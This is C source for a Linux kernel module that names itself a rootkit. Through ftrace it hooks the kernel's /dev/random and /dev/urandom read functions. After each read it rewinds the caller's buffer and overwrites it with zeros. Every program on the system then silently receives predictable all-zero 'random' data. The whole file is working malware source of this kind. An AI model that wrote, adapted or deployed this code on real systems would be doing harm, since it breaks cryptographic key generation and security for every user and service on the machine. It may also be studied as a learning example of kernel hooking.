#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/uio.h>

#include "ftrace_rootkit_utils.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Linnnk");
MODULE_DESCRIPTION("Hooking char devices via Random");
MODULE_VERSION("1.0");

static asmlinkage ssize_t (*orig_random_read_iter)(struct kiocb* kiocb, struct iov_iter* iter);
static asmlinkage ssize_t (*orig_urandom_read_iter)(struct kiocb* kiocb, struct iov_iter* iter);

static asmlinkage ssize_t hook_random_read_iter(struct kiocb* kiocb, struct iov_iter* iter) {
    ssize_t bytes_read;
    size_t len;
    char* kbuffer = NULL;
    
    bytes_read = orig_random_read_iter(kiocb, iter);
    if (bytes_read <= 0) {
        return bytes_read; //return because I can't do anything with zero bytes
    }
    
    pr_debug("random_rootkit: intercepted read to /dev/random: %zd bytes\n", bytes_read);
    
    len = (size_t)bytes_read; //need to typecast because bytes_read is originally a ssize_t
    kbuffer = kzalloc(len, GFP_KERNEL);
    if (!kbuffer) {
        pr_err("random_rootkit: Unable to allocate kbuffer\n");
        return bytes_read;
    }
    
    iov_iter_revert(iter, bytes_read); //sets the iterator (user_buffer) back to the beginning
    if (copy_to_iter(kbuffer, len, iter) != len) { //this should return # of bytes copied to
        pr_err("random_rootkit: copy_to_iter failed\n");
    }
    
    kfree(kbuffer);
    return bytes_read;
}

static asmlinkage ssize_t hook_urandom_read_iter(struct kiocb* kiocb, struct iov_iter* iter) {
    ssize_t bytes_read;
    size_t len;
    char* kbuffer = NULL;
    
    bytes_read = orig_urandom_read_iter(kiocb, iter);
    if (bytes_read <= 0) {
        return bytes_read;
    }
    
    pr_debug("random_rootkit: intercepted read to /dev/urandom: %zd bytes\n", bytes_read);
    
    len = (size_t)bytes_read;
    kbuffer = kzalloc(len, GFP_KERNEL);
    if (!kbuffer) {
        pr_err("random_rootkit: Unable to allocate kbuffer\n");
        return bytes_read;
    }
    
    iov_iter_revert(iter, bytes_read);
    if (copy_to_iter(kbuffer, len, iter) != len) {
        pr_err("random_rootkit: copy_to_iter failed\n");
    }
    
    kfree(kbuffer);
    return bytes_read;
}

static struct ftrace_hook hooks[] = {
    HOOK_DIRECT("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
    HOOK_DIRECT("urandom_read_iter", hook_urandom_read_iter, &orig_urandom_read_iter),
};

static int __init random_rootkit_init(void) {
    int err;
    
    err = install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("random_rootkit: Failed to install hooks\n");
        return err;
    }
    
    pr_info("random_rootkit: Loaded\n");
    return 0;
}

static void __exit random_rootkit_exit(void) {
    remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("random_rootkit: Removed\n");
}

module_init(random_rootkit_init);
module_exit(random_rootkit_exit);